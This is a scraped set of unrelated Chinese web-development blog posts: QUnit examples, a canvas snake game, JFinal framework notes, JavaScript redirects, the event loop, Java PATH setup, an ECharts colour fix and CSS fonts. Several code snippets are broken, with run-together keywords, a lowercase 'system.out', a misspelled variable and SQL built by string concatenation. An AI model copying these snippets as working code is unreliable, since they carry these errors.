  </script>
</body>
</html>


结果






10、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "2 asserts", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append( "<div>hello!</div>" );
      assert.equal( $( "div", fixture ).length, 1, "div added successfully!" );
     
      fixture.append( "<span>hello!</span>" );
      assert.equal( $( "span", fixture ).length, 1, "span added successfully!" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果



11、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "Appends a div", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append( "<div>hello!</div>" );
      assert.equal( $( "div", fixture ).length, 1, "div added successfully!" );
    });
     
    QUnit.test( "Appends a span", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append("<span>hello!</span>" );
      assert.equal( $( "span", fixture ).length, 1, "span added successfully!" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>

结果



12、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--ok()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "global pollution", function( assert ) {
      window.pollute = true;
      assert.ok( pollute, "nasty pollution" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果





13、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--module()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.module( "group a" );
    QUnit.test( "a basic test example", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
    QUnit.test( "a basic test example 2", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
     
    QUnit.module( "group b" );
    QUnit.test( "a basic test example 3", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
    QUnit.test( "a basic test example 4", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果






14、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--module()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.module( "module", {
      beforeEach: function( assert ) {
        assert.ok( true, "one extra assert per test" );
      }, afterEach: function( assert ) {
        assert.ok( true, "and one extra assert after each test" );
      }
    });

    QUnit.test( "test with beforeEach and afterEach", function(assert) {
      assert.expect( 2 );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>


结果










版权声明：本文为博主原创文章，未经博主允许不得转载。

最简单的HTML5游戏——贪吃蛇
<html>
<head>
<meta charset="UTF-8"/>
<title>贪吃蛇</title>
</head>

<body>
    <canvas id="canvas" width="1000" height="700"></canvas>
    <div>
        <input id="switch" type="button" value="开始" onclick="clickSwitch()"></input><br/>
        <input id="content" type="text" value="0"></input>
    </div>
</body>

<script type="text/javascript">
    const WIDTH = 1000;
    const HEIGHT = 700;
    const SNACK_WIDTH = 20;
    const SNACK_HEIGHT = 20;
    //移动时间间隔
    const TIME_MOVE = 300;
    //食物刷新时间
    const TIME_FOOD = 5000;
    //食物总量
    const TOTAL_FOOD = 200; 
    //石头刷新时间
    const TIME_STONE = 8000;
    //石头总量
    const TOTAL_STONE = 300; 
    
    var switchStatus = 0;
    var changeMove = "right";
    var currentMove = "right";
    //所有被用的位置
    var points = new Array();
    var snacks = new Array();
    var foods = new Array();
    var stones = new Array();
    var moveing = false;
    var timeMoveId, timeFoodId, timeStoneId;
    
    window.onload = function () {
        createGround();
    };
    
    //捕获按的哪个键
    function keyDown(event) {
        if (event.keyCode == "87") {
            //按下W键
            changeMove = "up";
        } else if (event.keyCode == "68") {
            //按下D键
            changeMove = "right";
        } else if (event.keyCode == "83") {
            //按下S键
            changeMove = "down";
        } else if (event.keyCode == "65") {
            //按下A键
            changeMove = "left";
        }
    }

    function handlePoints(x, y, type) {
        if (0 == type) {
            points.push(x+y*WIDTH);
        } else {
            var index = points.indexOf(x+y*WIDTH);
            if (index != -1) {
                points.splice(index, 1);
            }
        }
    }
    
    //贪吃蛇
    function snack(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //食物
    function food(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //石头
    function stone(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //开关操作
    function clickSwitch() {
        if (switchStatus == 0 || switchStatus == 2) {
            document.getElementById("switch").value = "暂停";
            if (switchStatus == 0) {
                //开始
                play();
            }
            switchStatus = 1;
        } else if (switchStatus == 1) {
            document.getElementById("switch").value = "继续";
            switchStatus = 2;
        }
    }
    
    //碰撞判定并操作
    function judge(x, y) {
        /*** 判断是否撞上边界  ***/
        if (x < 0 || x >= WIDTH || y < 0 || y >= HEIGHT) {
            end();
            return;
        } 
        
        var i;
        /*** 判断是否撞上自己  ***/
        for (i = 1; i < snacks.length; i++) {
            if (snacks[0].x == snacks[i].x && snacks[0].y == snacks[i].y) {
                end();
                return;
            }
        }
        
        /*** 判断是否撞上石头  ***/
        for (i = 0; i < stones.length; i++) {
            if (snacks[0].x == stones[i].x && snacks[0].y == stones[i].y) {
                end();
                return;
            }
        }
        
        /*** 判断是否撞上食物  ***/
         var flag = false;
        for (i = 0; i < foods.length; i++) {
            if (x == foods[i].x && y == foods[i].y) {
                flag = true;
                foods.splice(i, 1);
            }
        } 
        var newSnack = new snack(x, y);
        snacks.unshift(newSnack);
        if (!flag) {
            var p = snacks.pop();
            handlePoints(p.x, p.y, 1);
        }
        document.getElementById("content").value = "x:"+snacks[0].x+" y:"+snacks[0].y+" length:"+snacks.length;
        
        refresh();
    }
    
    //移动贪吃蛇
    function move() {
        if(moveing == false && switchStatus == 1) {
            moveing = true;
            if ((currentMove != "right" && changeMove == "left") || (currentMove == "left" && changeMove == "right")) {
                currentMove = "left";
                judge(snacks[0].x-SNACK_WIDTH, snacks[0].y);
            } else if ((currentMove != "down" && changeMove == "up") || (currentMove == "up" && changeMove == "down")) {
                currentMove = "up";
                judge(snacks[0].x, snacks[0].y-SNACK_HEIGHT);
            } else if ((currentMove != "left" && changeMove == "right")  || (currentMove == "right" && changeMove == "left")) {
                currentMove = "right";
                judge(snacks[0].x+SNACK_WIDTH, snacks[0].y);
            } else if ((currentMove != "up" && changeMove == "down") || (currentMove == "down" && changeMove == "up")){
                currentMove = "down";
                judge(snacks[0].x, snacks[0].y+SNACK_HEIGHT);
            } 
            changMove = currentMove;
        }
        moveing = false;
    }
    
    //创建地图
    function createGround() {
        var canvas = document.getElementById("canvas");
        var draw = canvas.getContext('2d');
        //清除原图形
        draw.clearRect(0, 0, WIDTH, HEIGHT);
        draw.strokeStyle = "red";
        draw.strokeRect(0, 0, WIDTH, HEIGHT);
    }
    
    //创建食物 
    function createFood() {
        if (foods.length < TOTAL_FOOD) {
            var x = Math.round(Math.random()*(WIDTH/SNACK_WIDTH-1))*SNACK_WIDTH;
            var y = Math.round(Math.random()*(HEIGHT/SNACK_HEIGHT-1))*SNACK_HEIGHT;
            if (points.indexOf(x+y*WIDTH) == -1) {
                var newFood = new food(x, y);
                //alert(newFood.x + "****" + newFood.y);
                var canvas = document.getElementById("canvas");
                var draw = canvas.getContext('2d');
                draw.fillStyle = "green";
                draw.fillRect(x, y, SNACK_WIDTH, SNACK_HEIGHT);
                foods.push(newFood);
                handlePoints(x, y, 0);
            }
        }
    }
    
    //创建石头
    function createStone() {
        if (stones.length < TOTAL_STONE) {
            var x = Math.round(Math.random()*(WIDTH/SNACK_WIDTH-1))*SNACK_WIDTH;
            var y = Math.round(Math.random()*(HEIGHT/SNACK_HEIGHT-1))*SNACK_HEIGHT;
            if (points.indexOf(x+y*WIDTH) == -1) {
                var newStone = new stone(x, y);
                var canvas = document.getElementById("canvas");
                var draw = canvas.getContext('2d');
                draw.fillStyle = "#663300";
                draw.beginPath();   
                draw.arc(x+SNACK_WIDTH*0.5, y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
                draw.closePath();                        
                draw.fill();
                stones.push(newStone);
                handlePoints(x, y, 0);
            }
        }
    }
    
    //刷新场景
    function refresh() {
        var canvas = document.getElementById("canvas");
        var draw = canvas.getContext('2d');
        //清除原图形
        draw.clearRect(1, 1, WIDTH-2, HEIGHT-2);
        
        /*** 边界  ***/
        draw.strokeStyle = "red";
        draw.strokeRect(0, 0, WIDTH, HEIGHT);
        
        var i;
        /*** 食物   ***/
        draw.fillStyle = "green";
        for (i = 0; i < foods.length; i++) {
            draw.fillRect(foods[i].x, foods[i].y, SNACK_WIDTH, SNACK_HEIGHT);
        }
        
        /*** 石头  ***/
        draw.fillStyle = "#663300";
        for (i = 0; i < stones.length; i++) {
            draw.beginPath();   
            draw.arc(stones[i].x+SNACK_WIDTH*0.5, stones[i].y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
            draw.closePath();                        
            draw.fill();
        }
        
        /***  贪吃蛇    ***/
        draw.fillStyle = "blue";                   
        draw.beginPath();   
        //圆心x坐标|圆心y坐标|半径|始|PI为圆周率，Math.PI*2为画圆|true为时针方向：逆时针，0为顺时针
        draw.arc(snacks[0].x+SNACK_WIDTH*0.5, snacks[0].y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
        draw.closePath();                        
        draw.fill(); 
        for (i = 1; i < snacks.length; i++) {
            draw.fillRect(snacks[i].x, snacks[i].y, SNACK_WIDTH, SNACK_HEIGHT);
        }
    }

    //游戏开始
    function play() {
        createGround();
        
        for (var i = 2; i > 0; i--) {
            var newSnack = new snack(SNACK_WIDTH*i, SNACK_HEIGHT);
            snacks.push(newSnack);
            handlePoints(newSnack.x, newSnack.y, 0);
        }
        refresh();
        
        document.onkeydown = keyDown;
        timeMoveId = setInterval(move, TIME_MOVE); 
        timeFoodId = setInterval(createFood, TIME_FOOD); 
        timeStoneId = setInterval(createStone, TIME_STONE); 
    }
    
    //游戏结束
    function end() {
        clearInterval(timeMoveId);  
        clearInterval(timeFoodId);  
        clearInterval(timeStoneId);  
        switchStatus = 0;
        changeMove = "right";
        currentMove = "right";
        points.length = 0;
        snacks.length = 0;
        foods.length = 0;
        stones.length = 0;
        moveing = false;
        document.getElementById("switch").value = "开始";
        document.getElementById("content").value = "游戏结束";
        alert("游戏结束");
    }
    
</script>

</html>



版权声明：本文为博主原创文章，未经博主允许不得转载。

JFanal框架介绍
最近有个项目使用了JFanal框架,我觉得挺好用.这篇文章介绍我的具体使用感受.如果想要了解JFanal,请至官网下载文档和demo.
 
我在项目中使用了JFanal框架如下东东:

路由

获取请求参数

设置属性以及视图中获取属性

模型与数据库

渲染

分页(Pagination)

 
有些技术可能有普遍的使用需求,但是我在这个项目中没有使用到:

ajax

 
下面一一介绍
路由
基于JFinal的web项目需要创建一个继承自JFinalConfig类的子类,该类用于对整个web项目进行配置.
来自<<jfinal-2.0-manual>>2.1 JFinalConfig概述
 
/**
 * 配置路由
 */
@Override
public voidconfigRoute(Routes me) {

me.add("/",IndexController.class,"/index");        //第三个参数为该Controller的视图存放路径

me.add("/blog",BlogController.class);        //第三个参数省略时默认与第一个参数值相同，在此即为 "/blog"
}
 
注意第三个参数缺省为index.因此BlogController类中实际处理/blog请求的是index函数.该函数没有参数,返回值为void.
publicvoid index() {
}
 
那么如何处理诸如/blog/save请求呢?BlogController再实现一个没有参数,返回值为void的save函数.
 
获取请求参数
Controller提供了getPara系列方法用来从请求中获取参数.
来自<<jfinal-2.0-manual>>3.3 Controller getPara系列方法
 
get和post方法请求都使用这种方式获取.处理请求方法函数中
Stringtitle = getPara("title");
 
设置属性以及视图中获取属性
使用setAttr系列函数设置属性
String prodNm =getPara("prodNm");
setAttr("prodNm",prodNm);
 
视图中通过如下方式获取属性
${(prodNm)!}
注意请不要通过${prodNm}方式获取属性,如果prodNm为null,那么浏览器渲染网页到此处时会报错并停止渲染.
 
模型与数据库
基于ActiveRecord的Model无需定义属性,无需定义getter,setter方法
来自<<jfinal-2.0-manual>>5.3 ActiveRecord Model
 
初次使用感觉挺神奇,挺方便.当然如同demo那样,有哪些字段最好在注释中说明清楚.
publicclass
Blog extends Model<Blog> {

public static final Blog me = new
Blog();
}
 
服务组件中
Blog
blog = Blog.me.findFirst(sql);
sql语句除了从单表中获取,也可以从多表中获取.
 
使用Db与Record类时,无需对数据库进行映射,Record相当于一个通用的Model.
来自<<jfinal-2.0-manual>>5.4 ActiveRecord JFinal独创的Db+Record模式
在实际使用中,我发现Db+Record模式也挺好用.临时需要获取某些字段又不想再麻烦创建一个模型时使用.
RecordcustomTypeName = Db.findFirst(sql);
StringstrCustomTypeName =customTypeName.getStr("customTypeName");
 
渲染
render系列方法将渲染不同类型的视图并返回给客户端.
来自<<jfinal-2.0-manual>>3.8 Controller render系列方法
 
这个项目控制器处理请求函数中只做三件事:

获取请求参数.

获取服务组件调用方法,返回模型或基本类型,设置属性.
渲染.
 
在渲染系列方法除了render("index.html")之外,我还发现renderJson()特别好用,它会将所有通过setAttr设置的变量转换成json数据并渲染.在开发视图之前,先将所有页面需要的属性设置,然后调用renderJson()渲染成json数据,检查数据,确保数据OK之后再开发视图.
 
分页
分页文档中没有介绍,但是demo中有.
step1
请将Jfanal框架的_paginate.html拷贝至项目WebRoot/common文件夹下.
 
step2
服务组件中提供返回值为Page<Record>的函数
publicPage<Record> paginate(intpageNumber, int pageSize) {

return Db.paginate(pageNumber, pageSize, sql,
sqlExcept);
}
注意我使用的是Db+Record模式,读者也可以使用demo中介绍的Db+Model模式.
 
step3
在控制器请求处理函数中调用
BlogService
blogServ =new BlogService();
setAttr("blogPage",blogServ.paginate(getParaToInt(0,
 1), 10));
 
step4
渲染视图中添加
<!-- 分页区域 -->
<#include"/common/_paginate.html" />
<@paginatecurrentPage=blogPage.pageNumbertotalPage=blogPage.totalPageactionUrl="/blog/"urlParas="?id=${(id)!}"/>
 
注意:JFanal框架对于多表联合查询没有优化,如果使用了多表联合查询,在大数据量情况下,效率令人抓狂.如需从多表中获取数据,请先从单表中获取
Page<Record>recordPage;
然后采用如下方法获取多表数据.
 
for(Recordr :
recordPage.getList()){

String sql2 ="select * from
table2where id="+r.getStr("foreignId");

Object table2Field1="空";

Object table2Field2="空";

if(Db.find(sql2).isEmpty()){

}else{
Recordr2 = Db.findFirst(sql2);
table2Field1=r2.get("field1");
table2Field2=r2.get("field2");

}

r.set("table2Field1",
table2Field1);

r.set("table2Field1",table2Field2);
}

版权声明：本文为博主原创文章，未经博主允许不得转载。

JavaScript实现页面跳转的五种方式
JavaScript实现页面跳转的五种方式第一种：<script type="text/javascript" language="javascript"> window.location.href="login.jsp?backurl="+window.location.href;</script>第二种：<script type="text/javascript" language="javascript"> alert("返回"); window.history.back(-1);</script>第三种：<script type="text/javascript" language="javascript">window.navigate("http://www.javaweb.cc");</script>第四种：<script type="text/javascript" language="JavaScript">self.location='top.htm';</script>第五种：<script type="text/javascript" language="javascript">alert("非法访问！"); top.location='http://javaweb.cc';</script></strong>

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

【JS】JavaScript引擎的内部运行机制
﻿﻿
最近在复习JavaScript，看到setTimeout函数时，想起以前刚学时，在一本书上看过setTimeout()里的回调函数执行的间隔时间有昌不是后面设置的值，以前没想太多，网上看了JS大神的解释，整理记录下JavaScript引擎的内部运行机制。
首先看一段小程序：
<script>
      alert('第1');
      setTimeout(function(){alert('第2');}, 2000);
      alert('第3');
</script>
输出顺序是：第1，第3，第2；再来看一段小程序：
<script>
      alert('第1');
      setTimeout(function(){alert('第2')}, 0);
      alert('第3');
</script>
输出顺序还是：第1，第3，第2；为什么不是第1，第2，第3；setTimeout的间隔时间设置为0不就是立即执行吗？在此引出JavaScript的运行机制：Event
 Loop（貌似译为事件轮询）。



JavaScript的任务队列
        因为JavaScript是单线程的，所有的任务只能是一个接一个的执行，但是当遇像IO这样的读取一些大文件时就会出现后一个任务长时间处于等待状态，要等到前一个任务执行完才能开始后一个任务。
因为这样，JavaScript也设计为主线程可以先不管IO设备，先执行后面的任务，等IO设备返回了结果，再回去继续执行。
        因此，在JavaScript中，所有的任务可以分为两种：一是同步任务（synchronous）；二是异步任务（asynchronous）。同步任务就是：在主线程上，必须等前一个任务执行完，才能执行后一个任务；异步任务则是：不进入主线程，而是进入“任务队列”（task
 queue）的任务，主线程只有在得到“任务队列”的通知，某个异步任务可以执行，该异步任务才会进入主线程执行。

其实“任务队列”就是一个事件的队列，主线程读取“任务队列”，就是读取里面的事件。这些事件一般包括IO设备的事件、点击、滚动事件，凡是指定过回调函数（callback），这些事件发生时就会进入“任务队列”。异步任务必须指定回调函数，主线程执行异步任务，就是执行对应的回调函数。
oText.innerText = '...';

比如在某一页面中，执行了上面这一代码后，DOM的内容会发生改变，接着系统触发DOM Changed事件，产生异步回调，回调函数被添加到“任务队列”中。


Event
 Loop
1.同步任务在主线程上执行会形成一个“执行栈”（execution context stack）;
2.异步任务在“任务队列”里有运行结果就会在“任务队列”里置一事件（Event）；
3.当“执行栈”中的同步任务都执行完后，“任务队列”中有运行结果（事件，比如：Mouse Clicks、Key Presses、定时事件等）的异步任务就会进入“执行栈”，开始执行；
主线程从“任务队列”读取事件的过程是不断循环的，这种机制就称为Event Loop。


Event Loop图解：

只有“执行栈”中任务执行完了，就会去读取“任务队列”，执行各事件相对应的回调函数。


现在应该明白开篇中，为什么setTimeout的间隔时间设置为0却最后执行了吧，因为要等“执行栈”中的代码执行完后，才会去执行“任务队列”中的回调函数。










Author：顾故

Sign：别输给曾经的自己










版权声明：本文为博主原创文章，未经博主允许不得转载。

找不到要编译的文件——path环境变量配置
        隔了段时间没有学习j2se，写了一段demo发现编译不成功，找不到需要编译的文件了，以一个最简单的程序为例，HelloWorld.java的程序
解决方法：
①判断JDK安装是否正确
       先来看看JDK安装的对不对，我的JDK安装的是1.8.0_45版本的，放在了C盘，找到C:\jdk1.8.0_45\bin后，输入java


出现了下图，说明JDK安装正确！



查看一下java的编译功能是否可以用：输入javac

出现以上内容，说明java的编译功能正常可用！
②编译

假设把代码放到了D盘的JAVA文件夹里，新建一个HelloWorld.java的程序
<strong><span style="font-size:18px;">public class HelloWorld
{
	public static void main(String[] args){
	system.out.println("HelloWorld");
	}
}</span></strong>


输入C:\jdk1.8.0_45\bin\javac HelloWorld.java，出现HelloWorld.class证明编译成功，但是直接输入javac HelloWorld.java，证明是环境变量Path配置有问题，找到根源。

③解决path 的问题
1、在【我的电脑】上按右键，选择【属性】
2、选择【系统属性】面板上面的【高级系统设置】选项，然后选择下面的【环境变量】 

3、选择【环境变量】中的【Path】，如果没有的话，就点击【新建】，【变量名】为Path,【变量值】为C:\jdk1.8.0_45\bin（以我的jdk安装的路径为例），点击确定即可。如果有的话，直接找到【Path】，双击，在变量值后加入[;C:\jdk1.8.0_45\bin]，“;”的目的是为了和原来的路径相隔开，点击确定，重新启动cmd既可正常运行了。





④为什么使用path变量？
        使用path变量后，只要输入对应的目录，自动对该目录下的文件查找需要编译的java文件，而不用去输入jdk的目录，使用的更方便。需要明确一点的是：需要确定是在哪个文件夹下的java文件需要javac。
总结：
        配置JDK环境和编译的步骤是很简单的，重要的了解为什么要使用path变量，没有什么问题是解决不了的！



版权声明：本文为博主原创文章，未经博主允许不得转载。

解决echart（1.4.1） 柱形图不能随着值改变颜色的问题
Echart1.4.1效果图









如果是最新的2.2.7，大家可以参照官网提供的http://echarts.baidu.com/doc/example/bar15.html 
如果是1.4.1，那么color中如果写function（params），params没有向2.2.7中那么多的参数，如果还要颜色随值变化，可以这样处理

var zrColor = require('zrender/tool/color');




var colorNo=0;
		//设置柱状图
		function setColumnChart(x_value,y_value,colorBegin,colorEnd){
			option_column.xAxis[0].data=x_value;
			option_column.series[0].data=y_value;
			option_column.series[0].itemStyle.normal.color= function(params) {
															//获取两种颜色之间渐变颜色数组
															var colorList = zrColor.getStepColors(colorBegin,colorEnd, 100);
															//获取数组中第几个值
															var item=parseInt(y_value[colorNo]);
															var curColor=colorList[item];
															//用于遍历数值数组
															colorNo++;
															//遍历完成数值，重置控制变量
															if(colorNo==y_value.length){
																colorNo=0;
															}
                        									return curColor;
                    									}
			myChart_column.setOption(option_column);  
		}



版权声明：本文为博主原创文章，未经博主允许不得转载。

CSS字体和文本
字体
是什么
字体是“文字的不同体式”或者“字的形体结构”。对于英文而言，每种字体都是由一组具有独特样式的字母、数字和符号组成的。根据外观，字体可以分为不同的类别（font collection），包括衬线字体（serif）、无衬线字体（sans-serif）和等宽字体（monospace）。每一类字体可以分成不同的字体族（font family），比如 Times 和 Helvetica。而字体族中又可以包含不同的字型（font face），反映了相应字体族基本设计的不同变化，例如 Times Roman、 Times Bold、 Helvetica Condensed 和 Bodoni italic。CSS字体属性主要描述一类字体的大小和外观，比如：使用什么字体族（是 Times，还是 Helvitica），多大字号，粗体还是斜体。

font-maily：字体簇
font-size：字体大小
font-weight：字体粗细
font-style：字体样式
font-variant：字体变化
font：字体简写

字体簇
font-family 用于设定元素中的文本使用什么字体，具体用法参考font-family，其常见应用和问题如下：

字体来源 
用户机器中安装的字体；
保存在第三方网站上的字体，如：Typeket和Google Fonts
保存在自身Web服务器上的字体，这些字体通过@font-face引入；
继承性 
font-family是可以继承的属性，因此它的值会遗传给所有后代元素。在实际应用font-family的时候，应该给整个页面设定一种主字体，然后只对那些需要使用不同字体的元素再应用 font-family。要为整个页面指定字体，可以设定 body 元素的 font-family 属性。
字体栈 
每种操作系统自带的字体不多，而且用户随时会安装和删除字体，因此不敢保证一定能应用某种字体来显示网页。为此，在指定文本的字体时，需要多列出几种后备字体，以防第一种字体无效。这个列表也叫字体栈，例如：body {font-family:"trebuchet ms", tahoma, sans-serif;}。注意，字体栈的最后一项要指定一个通用的字体类，如：sans-serif。通用的字体类有： 
serif：衬线字体，字符笔画的末端会有一些装饰线；
sans-serif：无衬线字体，字符笔画的末端没有装饰线；
monospace：等宽字体，每个字符的宽度相等（也称代码体）；
cursive：草书体或手写体；
fantasy：不能归入其他类别的字体（一般都是奇形怪状的字体）。
字体搭配 
常见搭配 
verdana, tahoma, sans-serif
helvetica, arial, sans-serif
参考文献 
better-css-font-stacks
通用字体 
PC+Mac 
serif：Georgia，Palatino/Book Antiqua，Times New Roman
Sans-Serif：Arial，Arial Black，Arial Black，Tahoma，Trebuchet MS，Verdana
Monospace：Courier New，Lucida Console/Monaco
Cursive：Comic Sans MS
Fantasy：Impact
linux
android
ios
默认字体 
chrome：Arial，Sans-Serif
IE：。。。
firefox：。。。
如果字体名像 Trebuchet MS 一样多于一个单词（有空格），应该加上引号
font-family 的值（字体名）不区分大小写

字体大小
浏览器样式表默认为每个 HTML 元素都设定了 font-size，因此你在设定 font-size 的时候，其实是在修改默认值。由于字体大小在标记层次中是可以继承的，假如你对使用的字体大小单位怎么影响继承不十分了解，那很容易碰到有些字体莫名其妙变大或变小的问题。字体的具体用法可以参考font-size，常见应用和问题如下：

字体大小的默认值：16px
绝对单位 VS 相对单位 
绝对单位： 
简介：使用像素、派卡（pica）或英寸设定字体大小，另外
优点：实际字体设定多大就多大，与祖先元素的字体大小无关。
缺点：在需要调整页面所有元素的字体大小时，必须一个一个地修改样式表中的 font-size，相当麻烦。
其他：设定绝对字体大小时，也可以使用关键字值，比如：x-small、medium、x-large等。具体可参考Using_Keywords
相对单位 
简介：使用百分比、 em 或 rem（根元素的字体大小）设定字体大小。
优点：使用相对大小后，通过调整 body 元素的字体大小，可以成比例地改变所有元素的字体大小。或者，至少能通过改变某个祖先元素，只影响它的所有子元素。在反复修改布局设计的时候，这样显然能节省时间
缺点：可能会出现意外的“连锁反应”
其他：设定相对字体大小时，也可以使用关键字值，比如：smaller、larger。
使用rem 
简介：rem(root em)是CSS3新增的字体大小单位，也是相对单位，但rem是相对于HTML根元素的单位。
优点：既可以做到只修改根元素就成比例地调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。
缺点：存在浏览器兼容性问题，除了 IE8 及更早版本外，所有浏览器均已支持rem。
实际应用：对于不支持它的浏览器，需要多写一个绝对单位的声明，例如：p {font-size:14px; font-size:.875rem;}
浏览器缩放与字体大小调整对字体大小的影响 
浏览器缩放：整体调整
字体大小调整：相对单位调整，绝对单位不变

字体样式
字体样式默认是正体，也可以是斜体，具体用法参考font-style。在实际应用中，英文中的斜体主要表示强调，如果是为了表示强调设置font-style，那么在在 HTML 标记中直接使用<em>标签即可。
字体粗细
字体粗体的主要作用是表示重要，具体用法参考font-weight。 
在实际应用中，由于浏览器对font-weight的数字值实现各不相同，所以从常规字体到粗体的切换可能发生在不同的数值上——通常是 400。所以，对于font-weight属性来说，最好只用 bold 和 normal 这两个值。 
此外，HTML 元素 strong 也表示重要，而它的默样式就是粗体，如果要突出文本中的某一个字或次，请使用strong。
字体变化
font-variant属性除了normal，就只有一个值，即 small-caps——导致所有 
小写英文字母变成小型大写字母，具体用法请参考font-variant
属性简写
font 属性是一个简写形式，通过它只要一条 CSS 声明就可以设定所有字体属性，例如：p {font: bold italic small-caps .9em helvetica, arial, sans-serif;}。具体规则如下：

必须声明 font-size 和 font-family 的值
所有值必须按如下顺序声明： 
font-weight、 font-style、 font-variant 不分先后；
然后是 font-size；
然后是 font-size；

font属性除了用于字体属性的简写外，还可以给它指定一些特殊的值，如下所示：

caption：使用有标题的系统控件的文本字体（如按钮，菜单等）（CSS2）
icon：使用图标标签的字体（CSS2）
menu：使用菜单的字体（CSS2）
message-box：使用信息对话框的文本字体（CSS2）
small-caption：使用小控件的字体（CSS2）
status-bar：使用窗口状态栏的字体（CSS2）

参考文献：

font

其他属性

font-stretch
font-size-adjust

Web字体
Web字体指的是非用户机器中的字体。目前，可以通过使用@font-face规则在网页中嵌入Web字体，并且该功能已经得到了浏览器广泛支持。设定Web字体的方式如下所示：

使用Google Web Fonts或Adobe的Typekit等公共字体 
以Google Web Fonts为例，访问https://www.google.com/fonts，找到想要的字体，单击“Add To Collection”，然后单击页面底部的 Use 按钮。Google 就会生成一个指向刚刚选定字体的<link>标签，直接把它复制粘贴到你的 HTML 文件中即可。例如：<link href='https://fonts.googleapis.com/css?family=Open+Sans|Roboto' rel='stylesheet' type='text/css'>，在CSS中引用下载的字体：font-family: 'Open Sans', Roboto, sans-serif;
使用@font-face规则 
使用@font-face规则的前提是可以从网站或第三方Web服务器下载到相应的字体包，以这种方式提供的字体，会在使用该字体的页面第一次加载时被浏览器下载并缓存起来，以后就不用下载了。使用@font-face的一个问题是不同的浏览器要求的字体格式不同，具体如下所示：
Firefox/Safari/Chrome/IOS Safari4.1以上版本：OTF——OpeType，TTF——TrueType；
IE：EOT——Embedded Open Type；
IOS Safari4.1之前版本：SVG——Scalable Vector Graphics；

Font Squirrel提供了很多现成的字体包，每个字体包中都包含所有必要格式的字体和为每款浏览器提供正确格式的 CSS 代码。另外，Font Squirrel还有一个转换程序，能够把你上传的字体转换成字体包。下面就是 Font Squirrel 为 Ubuntu Titling Bold 字体生成的@font-face 代码。对于其他来源的字体，这种格式也是适用的。
@font-face {
    /*这就是将来在字体栈中引用的字体族的名字*/
    font-family:'UbuntuTitlingBold';
    src: url('UbuntuTitling-Bold-webfont.eot');
    src: url('UbuntuTitling-Bold-webfont.eot?#iefix') format('embedded-opentype'),
        url('UbuntuTitling-Bold-webfont.woff') format('woff'),
        url('UbuntuTitling-Bold-webfont.ttf') format('truetype'),
        url('UbuntuTitling-Bold-webfont.svg#UbuntuTitlingBold') format('svg');
    font-weight: normal;
    font-style: normal;
}
Web字体的其他问题：

Web字体可能导致机器中出现同名字体，以至混淆。为此，Web专家Paul Irish写过一个跨跨浏览器@font-face 的“笑脸版”，详细内容请参考bulletproof-font-face-implementation-syntax；
需要深入入了解@font-face规则的话，可以参考How to use @font-face；
除非浏览器统一支持一种字体格式，否则必须面对多种字体格式并存问题。如何使用@font-face规则处理多种字体格式，以及保证Internet Explorer取得必要的.eot格式的字体，可以参考fixing-ie9-font-face-problems。


文本
是什么
文本就是一组字或字符，比如章标题、段落正文等等，跟使用什么字体无关。 
CSS文本属性描述对文本的处理方式，比如：行高或者字符间距多大，有没有下划线和缩进。常用的CSS文本属性如下所示：

text-indent
letter-spacing
word-spacing
text-decoration
text-align
line-height
text-transform
vertical-align

文本缩进
text-indent属性设定行内盒子相对于包含元素的起点，具体用法参考text-indent，常见问题和注意点如下：

行内盒子
